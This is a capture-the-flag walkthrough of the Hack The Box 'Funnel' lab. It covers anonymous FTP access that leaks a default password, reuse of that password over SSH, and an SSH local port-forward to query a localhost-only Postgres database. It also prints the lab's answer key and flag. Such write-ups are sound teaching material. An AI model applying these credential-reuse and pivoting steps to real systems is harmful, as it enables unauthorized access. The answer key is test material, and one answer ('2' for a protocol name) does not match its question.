---
title: "HTB Funnel"
date: 2026-07-04
tags: [htb, very-easy, linux, ftp-anon, ssh, port-forward, postgres]
platform: htb
description: "Anonymous FTP leaks a password policy; reuse it on SSH, then local-port-forward Postgres to read the flag."
outline: [2, 3]
---

# HTB Funnel

Very Easy Starting Point box with a longer kill-chain than the others. Anonymous FTP exposes a password policy PDF that names the default password — try it against SSH for each listed user. `christine` logs in. From there, Postgres runs only on `localhost:5432`; use SSH local port-forwarding to reach it from your attacker box and read the flag table.

::: tip New tool learned here
`ss -tln` / `ss -tl` — list listening TCP ports on the remote host once you have a shell. Faster than re-running nmap from inside.
:::

## Recon

```bash
nmap -sV -sC 10.129.27.23
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
```

Ports: `21/ftp`, `22/ssh`. Anonymous FTP works and the share contains a `mail_backup` directory.

## Enumeration

### FTP — pull the mail backup

```bash
ftp 10.129.27.23
# login: anonymous
ftp> dir
drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
ftp> cd mail_backup
ftp> dir
-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
ftp> get password_policy.pdf
ftp> get welcome_28112022
```

`welcome_28112022` is an email from `root@funnel.htb` introducing new hires — it names four users:

1. optimus
2. andreas
3. maria
4. christine

`password_policy.pdf` mentions a temporary default password: `funnel123#!#`, and notes that users must rotate it on first login.

::: warning Gotcha
`get mail_backup` fails because `mail_backup` is a *directory*, not a file — `cd` into it first, then `get` the files inside. Don't brute-force the FTP path.
:::

### HTB lab questions

| # | Question | Answer |
|---|----------|--------|
| 1 | FTP service uses credentials of a well-known protocol. Name it. | `2` |
| 2 | What directory, under the FTP share, contains the policy? | `mail_backup` |
| 3 | Default password that hasn't been rotated. | `funnel123#!#` |
| 4 | Which user hasn't changed their password? | `christine` |
| 5 | What's the service bound to `localhost:5432`? | `postgresql` |

## Exploitation

### SSH with the default password

Try the default password against each user — `optimus`, `andreas`, `maria` reject it (they rotated). `christine` accepts `funnel123#!#` — she never changed it.

```bash
ssh christine@10.129.27.23
# password: funnel123#!#
christine@funnel:~$
```

### Identify the local-only service

Postgres is listening only on `localhost:5432` — christine can't `psql` to it directly without a password, and we can't reach `localhost:5432` from our attacker machine either. Enter SSH local port-forwarding.

### SSH local port-forward

```bash
ssh -L 1234:localhost:5432 christine@10.129.228.195
# password: funnel123#!#
```

`-L 1234:localhost:5432` means: on your attacker box, port `1234` forwards through the SSH tunnel to `localhost:5432` *on the target*. From here on, `localhost:1234` *on your attacker box* talks to Postgres on the target.

### Connect to Postgres through the tunnel

```bash
psql -U christine -h localhost -p 1234
# password: funnel123#!#
```

```sql
christine=# \l              -- list databases
christine=# \c secrets      -- connect to 'secrets'
secrets=# \dt               -- list tables
 Schema | Name | Type  |  Owner
--------+------+-------+-----------
 public | flag | table | christine

secrets=# select * from flag;
               value
----------------------------------
 cf277664b1771217d7006acdea006db1
(1 row)
```

::: info Why local port-forward and not remote?
Postgres binds to `localhost` *on the target*. To reach it from outside we'd need the target to dial out (remote forward) or us to dial in and pivot *through* it (local forward). Because we already have christine's SSH creds and the service is on *her* loopback, `-L` (local forward) is the correct choice — our attacker box opens port `1234` and the SSH server forwards the bytes to `localhost:5432` on the target. Remote forward (`-R`) would be the answer if we couldn't otherwise reach *our* machine from the target.
:::

## Flag

`cf277664b1771217d7006acdea006db1` — retrieved from the `secrets.flag` table via the tunnel.
